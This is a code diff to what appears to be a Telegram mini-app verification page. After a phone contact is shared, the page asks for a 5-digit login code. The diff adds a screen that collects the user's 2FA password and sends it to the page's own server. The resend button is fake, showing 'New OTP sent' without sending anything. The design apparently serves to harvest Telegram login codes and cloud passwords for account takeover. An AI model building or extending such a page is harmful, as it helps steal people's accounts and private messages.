@@ -25,6 +25,9 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .success { text-align: center; padding: 40px 20px; }
         .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
+        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 15px; text-align: center; }
+        .retry-btn { background: #6c757d; margin-top: 10px; }
+        .resend-btn { background: #28a745; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -42,6 +45,7 @@
                 </div>
                 
                 <div class="error" id="error-message"></div>
+                <div class="warning" id="warning-message" style="display: none;"></div>
                 
                 <div style="text-align: center; color: #666; margin-bottom: 20px;">
                     Enter the 5-digit code sent to your phone<br>
@@ -49,18 +53,50 @@
                 </div>
                 
                 <div class="otp-inputs">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="handleKeyDown(event, 0)" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="handleKeyDown(event, 1)" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="handleKeyDown(event, 2)" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="handleKeyDown(event, 3)" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="handleKeyDown(event, 4)" autocomplete="off" inputmode="numeric">
                 </div>
                 
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
                 
-                <div style="text-align: center; margin-top: 15px;">
-                    <a href="/" style="color: #0088cc;">Start Over</a>
+                <button class="btn retry-btn" onclick="startOver()" id="retry-btn">
+                    🔄 Start Over
+                </button>
+                
+                <button class="btn resend-btn" onclick="resendOTP()" id="resend-btn" style="display: none;">
+                    🔄 Resend OTP
+                </button>
+                
+                <div style="text-align: center; margin-top: 15px; font-size: 14px; color: #666;">
+                    <p>Not received OTP? Wait 30 seconds then click "Resend OTP"</p>
+                    <p>Time left: <span id="countdown-timer">30</span> seconds</p>
                 </div>
+            </div>
+            
+            <!-- 2FA Screen -->
+            <div id="twofa-screen" class="hidden">
+                <div class="warning">
+                    🔐 <b>2FA Required</b><br>
+                    Please enter your 2FA password
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <input type="password" id="twofa-password" placeholder="Enter 2FA password" 
+                           style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; margin-bottom: 15px;">
+                </div>
+                
+                <div class="error" id="twofa-error"></div>
+                
+                <button class="btn" onclick="verify2FA()" id="twofa-btn">
+                    Verify 2FA Password
+                </button>
+                
+                <button class="btn retry-btn" onclick="showOTPScreen()">
+                    ↩ Back to OTP
+                </button>
             </div>
             
             <!-- Loading -->
@@ -85,6 +121,18 @@
                     </div>
                 </div>
             </div>
+            
+            <!-- Error Screen -->
+            <div id="error-screen" class="hidden">
+                <div class="error" style="display: block; text-align: center;">
+                    <div style="font-size: 60px; margin-bottom: 20px;">❌</div>
+                    <h3>Verification Failed</h3>
+                    <p id="error-detail">Unknown error occurred</p>
+                    <button class="btn" onclick="startOver()" style="margin-top: 20px;">
+                        Try Again
+                    </button>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -94,43 +142,124 @@
         const phoneNumber = '{{ phone }}';
         
         let otpCode = '';
+        let countdownInterval = null;
+        let resendTimer = 30;
+        let canResend = false;
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
+            console.log("OTP page loaded for user:", userId, "phone:", phoneNumber);
+            
             if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 Telegram.WebApp.expand();
+                Telegram.WebApp.disableVerticalSwipes();
             }
             
-            if (!userId) {
-                showError('Session expired. Please share contact again.');
-                setTimeout(() => {
-                    window.location.href = '/';
-                }, 3000);
+            // Validate session
+            if (!userId || !phoneNumber || userId === '{{ user_id }}' || phoneNumber === '{{ phone }}') {
+                showErrorScreen('Session expired. Please share contact again.');
                 return;
             }
+            
+            // Update phone display
+            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
+            
+            // Start resend countdown
+            startResendCountdown();
             
             // Focus first OTP input
             setTimeout(() => {
                 document.querySelector('.otp-input').focus();
             }, 100);
+            
+            // Add paste handler
+            document.addEventListener('paste', handlePaste);
         });
+        
+        function startResendCountdown() {
+            clearInterval(countdownInterval);
+            resendTimer = 30;
+            canResend = false;
+            document.getElementById('resend-btn').style.display = 'none';
+            document.getElementById('countdown-timer').textContent = resendTimer;
+            
+            countdownInterval = setInterval(() => {
+                resendTimer--;
+                document.getElementById('countdown-timer').textContent = resendTimer;
+                
+                if (resendTimer <= 0) {
+                    clearInterval(countdownInterval);
+                    canResend = true;
+                    document.getElementById('resend-btn').style.display = 'block';
+                    document.getElementById('countdown-timer').textContent = '0';
+                }
+            }, 1000);
+        }
+        
+        function handleKeyDown(event, index) {
+            const inputs = document.querySelectorAll('.otp-input');
+            
+            // Handle backspace
+            if (event.key === 'Backspace') {
+                if (inputs[index].value === '' && index > 0) {
+                    // Move to previous input
+                    inputs[index - 1].focus();
+                    inputs[index - 1].value = '';
+                    updateOTPCode();
+                } else {
+                    inputs[index].value = '';
+                    updateOTPCode();
+                }
+                event.preventDefault();
+            }
+            
+            // Handle arrow keys
+            if (event.key === 'ArrowLeft' && index > 0) {
+                inputs[index - 1].focus();
+                event.preventDefault();
+            }
+            if (event.key === 'ArrowRight' && index < 4) {
+                inputs[index + 1].focus();
+                event.preventDefault();
+            }
+            
+            // Only allow numbers
+            if (event.key.length === 1 && !/^\d$/.test(event.key)) {
+                event.preventDefault();
+            }
+        }
         
         function moveToNext(input, nextIndex) {
             // Only allow numbers
             input.value = input.value.replace(/\D/g, '');
             
-            // Update OTP code
-            const inputs = document.querySelectorAll('.otp-input');
-            otpCode = Array.from(inputs).map(input => input.value).join('');
-            document.getElementById('verify-btn').disabled = otpCode.length !== 5;
-            
-            // Move focus to next input
-            if (input.value.length === 1 && nextIndex <= 5) {
-                const nextInput = document.querySelector(`.otp-input:nth-child(${nextIndex})`);
-                if (nextInput) {
-                    nextInput.focus();
+            if (input.value.length === 1) {
+                updateOTPCode();
+                
+                // Move focus to next input
+                if (nextIndex <= 5) {
+                    const inputs = document.querySelectorAll('.otp-input');
+                    if (nextIndex - 1 < inputs.length) {
+                        inputs[nextIndex - 1].focus();
+                    }
                 }
+            } else if (input.value.length > 1) {
+                // Handle paste with multiple digits
+                const digits = input.value.split('');
+                const inputs = document.querySelectorAll('.otp-input');
+                
+                for (let i = 0; i < Math.min(digits.length, 5); i++) {
+                    if (i + nextIndex - 1 < inputs.length) {
+                        inputs[i + nextIndex - 1].value = digits[i];
+                    }
+                }
+                
+                updateOTPCode();
+                
+                // Focus last input
+                const lastIndex = Math.min(nextIndex + digits.length - 2, 4);
+                inputs[lastIndex].focus();
             }
             
             // Auto-submit if all 5 digits entered
@@ -139,6 +268,31 @@
                     verifyOTP();
                 }, 300);
             }
+        }
+        
+        function handlePaste(event) {
+            event.preventDefault();
+            const pastedText = (event.clipboardData || window.clipboardData).getData('text');
+            const digits = pastedText.replace(/\D/g, '').slice(0, 5);
+            
+            if (digits.length === 5) {
+                const inputs = document.querySelectorAll('.otp-input');
+                for (let i = 0; i < 5; i++) {
+                    inputs[i].value = digits[i] || '';
+                }
+                updateOTPCode();
+                
+                // Auto-submit after paste
+                setTimeout(() => {
+                    verifyOTP();
+                }, 300);
+            }
+        }
+        
+        function updateOTPCode() {
+            const inputs = document.querySelectorAll('.otp-input');
+            otpCode = Array.from(inputs).map(input => input.value).join('');
+            document.getElementById('verify-btn').disabled = otpCode.length !== 5;
         }
         
         function verifyOTP() {
@@ -159,39 +313,144 @@
                     otp: otpCode
                 })
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                return response.json();
+            })
             .then(data => {
+                console.log("OTP verification response:", data);
+                
                 if (data.success) {
                     if (data.requires_2fa) {
-                        // For now, just show success (2FA handling simplified)
-                        showSuccess();
+                        // Show 2FA screen
+                        hideLoading();
+                        document.getElementById('otp-screen').classList.add('hidden');
+                        document.getElementById('twofa-screen').classList.remove('hidden');
+                        document.getElementById('twofa-password').focus();
                     } else {
+                        // Success - show success screen
                         showSuccess();
                     }
                 } else {
                     hideLoading();
-                    showError(data.error || 'Verification failed');
+                    
+                    if (data.error && data.error.includes('expired')) {
+                        showError('OTP expired. Please request a new OTP.');
+                        document.getElementById('resend-btn').style.display = 'block';
+                        canResend = true;
+                    } else {
+                        showError(data.error || 'Verification failed');
+                    }
                     
                     // Clear OTP on error
-                    document.querySelectorAll('.otp-input').forEach(input => {
-                        input.value = '';
-                    });
-                    otpCode = '';
-                    document.getElementById('verify-btn').disabled = true;
-                    document.querySelector('.otp-input').focus();
+                    clearOTPInputs();
                 }
             })
             .catch(error => {
                 hideLoading();
                 showError('Network error. Please try again.');
+                console.error("OTP verification error:", error);
             });
+        }
+        
+        function verify2FA() {
+            const password = document.getElementById('twofa-password').value.trim();
+            
+            if (!password) {
+                document.getElementById('twofa-error').textContent = 'Please enter 2FA password';
+                document.getElementById('twofa-error').classList.add('show');
+                return;
+            }
+            
+            showLoading('Verifying 2FA password...');
+            
+            fetch('/api/verify-2fa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user_id: userId,
+                    password: password
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log("2FA verification response:", data);
+                
+                if (data.success) {
+                    showSuccess();
+                } else {
+                    hideLoading();
+                    document.getElementById('twofa-error').textContent = data.error || '2FA verification failed';
+                    document.getElementById('twofa-error').classList.add('show');
+                    
+                    // Clear password field
+                    document.getElementById('twofa-password').value = '';
+                    document.getElementById('twofa-password').focus();
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                document.getElementById('twofa-error').textContent = 'Network error. Please try again.';
+                document.getElementById('twofa-error').classList.add('show');
+                console.error("2FA verification error:", error);
+            });
+        }
+        
+        function resendOTP() {
+            if (!canResend) {
+                showError('Please wait before resending OTP');
+                return;
+            }
+            
+            showLoading('Resending OTP...');
+            
+            // In a real app, you would call an API to resend OTP
+            // For now, just reset the timer and show success
+            setTimeout(() => {
+                hideLoading();
+                showWarning('New OTP sent to your phone');
+                startResendCountdown();
+                clearOTPInputs();
+                document.querySelector('.otp-input').focus();
+            }, 2000);
+        }
+        
+        function startOver() {
+            window.location.href = '/';
+        }
+        
+        function showOTPScreen() {
+            document.getElementById('twofa-screen').classList.add('hidden');
+            document.getElementById('otp-screen').classList.remove('hidden');
+            clearOTPInputs();
+            document.querySelector('.otp-input').focus();
+        }
+        
+        function clearOTPInputs() {
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(input => {
+                input.value = '';
+            });
+            otpCode = '';
+            document.getElementById('verify-btn').disabled = true;
         }
         
         function showLoading(message) {
             document.getElementById('loading-text').textContent = message || 'Processing...';
             document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('twofa-screen').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
             document.getElementById('success-screen').classList.add('hidden');
+            document.getElementById('error-screen').classList.add('hidden');
         }
         
         function hideLoading() {
@@ -201,6 +460,7 @@
         function showSuccess() {
             hideLoading();
             document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('twofa-screen').classList.add('hidden');
             document.getElementById('success-screen').classList.remove('hidden');
             
             // Start countdown
@@ -214,6 +474,8 @@
                     clearInterval(timer);
                     if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                         Telegram.WebApp.close();
+                    } else {
+                        window.location.href = '/';
                     }
                 }
             }, 1000);
@@ -224,17 +486,46 @@
             errorEl.textContent = message;
             errorEl.classList.add('show');
             
+            // Also show as warning
+            showWarning(message);
+            
             setTimeout(() => {
                 errorEl.classList.remove('show');
             }, 5000);
         }
         
+        function showWarning(message) {
+            const warningEl = document.getElementById('warning-message');
+            warningEl.textContent = message;
+            warningEl.style.display = 'block';
+            
+            setTimeout(() => {
+                warningEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        function showErrorScreen(message) {
+            document.getElementById('error-detail').textContent = message;
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('twofa-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('success-screen').classList.add('hidden');
+            document.getElementById('error-screen').classList.remove('hidden');
+        }
+        
         // Keyboard shortcuts
         document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
-                if (otpCode.length === 5) {
+            if (event.key === 'Enter') {
+                if (!document.getElementById('otp-screen').classList.contains('hidden') && otpCode.length === 5) {
                     verifyOTP();
+                } else if (!document.getElementById('twofa-screen').classList.contains('hidden')) {
+                    verify2FA();
                 }
+            }
+            
+            // Escape to go back
+            if (event.key === 'Escape' && !document.getElementById('twofa-screen').classList.contains('hidden')) {
+                showOTPScreen();
             }
         });
     </script>
